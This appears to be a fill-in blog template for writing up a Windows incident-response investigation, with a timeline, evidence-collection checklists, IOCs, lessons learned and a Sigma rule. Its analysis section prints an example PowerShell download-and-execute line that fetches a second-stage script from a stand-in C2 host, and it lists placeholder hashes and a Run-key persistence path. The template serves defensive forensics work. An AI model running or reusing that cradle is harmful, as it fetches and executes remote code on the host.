---
date: 2024-11-01
authors:
  - n1ghtfury
tags:
  - DFIR
  - Incident Response
  - Digital Forensics
  - Timeline Analysis
  - IOC
  - Memory Forensics
  - Disk Forensics
  - Windows
  - Evidence Collection
  - Root Cause Analysis
  - Malware Analysis
categories:
  - DFIR & Threat Hunting
---

# [Incident Name] — DFIR Investigation Writeup

Replace this with a 2–3 sentence incident summary. Describe the incident type, scope, and key
finding. This text appears on the blog index card.

<!-- more -->

!!! abstract "Incident at a Glance"
    - **Type:** Ransomware / BEC / Data Exfil / Insider Threat
    - **Severity:** :material-circle:{ style="color: red" } Critical
    - **Affected Systems:** X endpoints · Y servers · Z identities
    - **Initial Vector:** Phishing / Exposed RDP / Supply Chain
    - **Dwell Time:** X days

---

## Incident Overview

| Field | Value |
|-------|-------|
| Incident Type | |
| Affected Systems | |
| Discovery Date | YYYY-MM-DD |
| Containment Date | YYYY-MM-DD |
| Severity | Critical / High / Medium / Low |
| Dwell Time | X days |
| Attribution | Suspected group / Unknown |

---

## Attack Timeline

| Timestamp (UTC) | Event | ATT&CK | Evidence Source |
|-----------------|-------|--------|-----------------|
| YYYY-MM-DD HH:MM | Initial access — phishing email | T1566.001 | Email gateway |
| +HH:MM | Macro drops dropper to `%TEMP%` | T1204.002 | Sysmon EID 11 |
| +HH:MM | Dropper executes beacon | T1059.001 | Sysmon EID 1 |
| +HH:MM | C2 callback over HTTPS/443 | T1071.001 | Proxy logs |
| +HH:MM | Domain enumeration | T1087.002 | Security EID 4688 |
| +HH:MM | Lateral movement to DC via RDP | T1021.001 | Auth logs EID 4624 |
| +HH:MM | LSASS credential dump | T1003.001 | Sysmon EID 10 |
| +HH:MM | Data staged for exfiltration | T1074.001 | Sysmon EID 11 |
| +HH:MM | Exfiltration over C2 channel | T1041 | Network capture |

---

## Evidence Collection

=== "Endpoint"
    - Live memory image: `winpmem`, `DumpIt`
    - Full disk image: `FTK Imager`
    - MFT: `$MFT`, `$LogFile`, `$UsnJrnl`
    - All EVTX channels (Security, System, Sysmon, PowerShell)
    - Prefetch, Amcache, Shimcache
    - Registry hives: `NTUSER.DAT`, `SAM`, `SYSTEM`, `SECURITY`, `SOFTWARE`

=== "Network"
    - Full PCAP from NDR / network TAP
    - Firewall / proxy logs (egress)
    - DNS query logs
    - NetFlow / IPFIX records

=== "Identity"
    - AD security events: EID 4624, 4625, 4648, 4768, 4769, 4776
    - Privileged group changes: EID 4728, 4732
    - Azure AD / Entra ID sign-in logs

=== "Cloud / SaaS"
    - Azure Activity Log / AWS CloudTrail
    - Microsoft 365 Unified Audit Log
    - Conditional Access sign-in logs

---

## Analysis

### Initial Access

!!! danger "Entry Point Confirmed"
    Describe exactly how the attacker gained access. Include phishing lure details,
    attachment hash, sender domain, or exploited service.

```text
Email Subject: Invoice_Q4-2024.xlsm
Sender:        billing@evil-domain[.]com
Attachment:    Invoice_Q4-2024.xlsm
SHA256:        [hash]
```

### Execution & Persistence

```powershell
# Decoded PowerShell dropper recovered from ScriptBlock log (EID 4104)
IEX (New-Object Net.WebClient).DownloadString('http://c2[.]evil/stage2.ps1')
```

**Persistence mechanism:**

```text
Registry Run Key:
  HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate
  Value: C:\Users\Public\svc.exe
```

### Lateral Movement & Privilege Escalation

```text
Technique:   Pass-the-Hash (T1550.002)
Source host: WORKSTATION-01
Target host: DC-01
Account:     DOMAIN\Administrator
Evidence:    Security EID 4624 Type 3, NTLM auth
```

### Data Access & Impact

!!! danger "Data at Risk"
    Describe the data accessed, estimated volume, and confirmed or suspected exfiltration.

---

## Root Cause Analysis

!!! danger "Root Cause"
    One clear sentence: what single control failure allowed this incident to escalate?

**Contributing factors:**

- [ ] No MFA enforced on externally accessible service
- [ ] Macros not blocked by Group Policy
- [ ] EDR not deployed on affected hosts
- [ ] LSASS protections (PPL / Credential Guard) disabled

---

## Indicators of Compromise

```text
# File Hashes (SHA256)
aabbccddeeff...  dropper.exe
1122334455ff...  beacon.dll

# Network Indicators
203.0.113.10        # C2 IP
evil-domain[.]com

# Registry Persistence
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate

# File Paths
C:\Users\Public\svc.exe
C:\Windows\Temp\dropper.tmp
```

---

## Lessons Learned

| Gap | Root Cause | Recommended Fix | Priority |
|-----|-----------|-----------------|----------|
| No alert on macro execution | Policy not enforced | Block macros via GPO | Critical |
| LSASS dump not detected | PPL disabled | Enable Credential Guard | High |
| Log source missing | Agent not deployed | Deploy Sysmon | High |

---

## Detection Rules Derived

```yaml
title: Suspicious Scheduled Task Creation — Persistence Pattern
id: 00000000-0000-0000-0000-000000000000
status: experimental
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    Image|endswith: '\schtasks.exe'
    CommandLine|contains|all:
      - '/create'
      - '/sc onlogon'
  condition: selection
level: high
tags:
  - attack.persistence
  - attack.t1053.005
```

---

## References

- [MITRE ATT&CK](https://attack.mitre.org/)
- [Eric Zimmerman's Tools](https://ericzimmerman.github.io/)
